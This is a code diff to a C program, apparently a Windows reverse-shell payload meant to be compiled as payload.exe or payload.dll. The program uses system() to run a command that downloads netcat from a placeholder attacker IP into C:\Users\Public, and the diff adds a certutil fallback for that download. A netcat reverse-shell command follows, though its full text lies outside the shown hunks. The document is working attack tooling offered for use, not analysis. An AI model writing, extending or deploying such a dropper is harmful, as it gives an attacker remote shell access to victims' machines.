@@ -6,18 +6,20 @@
 
 /*
 * COMPILATION INSTRUCTIONS
-* For EXE file: x86_64-w64-mingw32-gcc nc_rev_shell.c -o payload.exe
-* For DLL file: x86_64-w64-mingw32-gcc -shared -o payload.dll nc_rev_shell.c
+* For x64 EXE file (standard): x86_64-w64-mingw32-gcc nc_shell.c -o payload.exe
+* For x86 EXE file: i686-w64-mingw32-gcc nc_shell.c -o payload.exe
+* For DLL file: x86_64-w64-mingw32-gcc -shared -o payload.dll nc_shell.c
 */
 
 int main(void) {
-    char downloadCmd[512];
+    char downloadCmd[1024];
     char reverseShellCmd[512];
 
-    // Build the download command using PowerShell's Invoke-WebRequest
+    // Download netcat if it doesn't exist
     snprintf(downloadCmd, sizeof(downloadCmd),
-        "if not exist C:\\Users\\Public\\nc.exe powershell -Command \"iwr -Uri http://%s/nc.exe -OutFile C:\\Users\\Public\\nc.exe\"",
-        ATTACKER_IP);
+        "if not exist C:\\Users\\Public\\nc.exe (powershell -Command \"iwr -Uri http://%s/nc.exe -OutFile C:\\Users\\Public\\nc.exe\" "
+        "|| certutil -urlcache -split -f http://%s/nc.exe C:\\Users\\Public\\nc.exe)",
+        ATTACKER_IP, ATTACKER_IP);
     system(downloadCmd);
 
     // Build the reverse shell command using netcat
@@ -28,4 +30,3 @@ int main(void) {
 
     return 0;
 }
-
